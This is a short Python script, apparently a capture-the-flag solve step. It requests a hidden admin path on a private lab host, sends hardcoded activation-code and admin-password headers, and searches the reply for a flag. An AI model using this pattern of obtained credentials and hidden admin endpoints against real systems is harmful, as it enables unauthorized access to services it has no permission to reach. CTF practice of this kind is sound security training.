#!/usr/bin/env python3
import requests
import json

BASE_URL = "http://192.168.100.110:54088"
HEADERS = {
    "x-activate-code": "8d7a77ae-dac9-4397-afd6-44b92fd5b6f7",
    "x-admin-pass": "QRSwojjqYV3r3FWvrQ_V3eminq-zZYc5BCZAu_6ptBM",
}
ADMIN_PATH = "/admin_1q8PqqscSiP46w"

print(f"=== Accessing Hidden Admin Path with Header ===")
try:
    resp = requests.get(f"{BASE_URL}{ADMIN_PATH}", headers=HEADERS)
    print(f"Status: {resp.status_code}")
    print("Response:")
    print(resp.text[:1000])

    try:
        data = resp.json()
        print(json.dumps(data, indent=2))

        # Check for flag in response
        if "flag" in str(data).lower():
            print("\n[+] FOUND FLAG string in response!")

    except:
        pass

except Exception as e:
    print(f"Error: {e}")
